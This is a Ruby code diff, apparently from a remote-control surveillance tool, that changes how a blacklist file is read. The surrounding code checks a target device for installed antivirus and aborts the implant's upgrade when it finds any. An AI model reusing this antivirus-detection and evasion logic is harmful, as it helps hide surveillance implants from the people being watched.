@@ -534,15 +534,17 @@ class Item
     installed = device[:data]['content']
 
     # check for installed AV
-    File.readlines(RCS::DB::Config.instance.file('blacklist')).each do |offending|
-      offending.chomp!
-      next unless offending
-      bver, bmatch = offending.split('|')
-      bver = bver.to_i
-      trace :debug, "Checking for #{bmatch} | #{bver} <= #{self.version.to_i}"
-      if Regexp.new(bmatch, Regexp::IGNORECASE).match(installed) != nil && (self.version.to_i <= bver || bver == 0 )
-        trace :warn, "Blacklisted software detected: #{bmatch}"
-        raise BlacklistError.new("The target device contains a software that prevents the upgrade.")
+    File.open(RCS::DB::Config.instance.file('blacklist'), "r:UTF-8") do |f|
+      while offending = f.gets
+        offending.chomp!
+        next unless offending
+        bver, bmatch = offending.split('|')
+        bver = bver.to_i
+        trace :debug, "Checking for #{bmatch} | #{bver} <= #{self.version.to_i}"
+        if Regexp.new(bmatch, Regexp::IGNORECASE).match(installed) != nil && (self.version.to_i <= bver || bver == 0 )
+          trace :warn, "Blacklisted software detected: #{bmatch}"
+          raise BlacklistError.new("The target device contains a software that prevents the upgrade.")
+        end
       end
     end
 
